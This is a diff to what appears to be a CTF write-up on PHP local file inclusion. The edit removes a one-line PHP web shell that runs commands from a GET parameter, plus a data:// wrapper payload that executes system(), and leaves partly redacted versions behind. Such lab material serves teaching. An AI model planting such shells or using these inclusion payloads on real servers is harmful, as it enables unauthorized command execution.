@@ -255,16 +255,13 @@ This means the value of the "file" parameter is directly included by PHP without
 After that, we create a file, for example `payload.php`, with the following content:
 
 ```php
-<?php
-echo "<pre>";
-system($_GET['cmd']);
-?>
+system($_GET['cmd'])
 ```
 
 Then simply run it to retrieve the flag:
 
 ```bash
-data://text/plain,<?php system("hostname"); ?>
+data://text/plain,<php code>
 ```
 
 ![alt text](image-22.png)
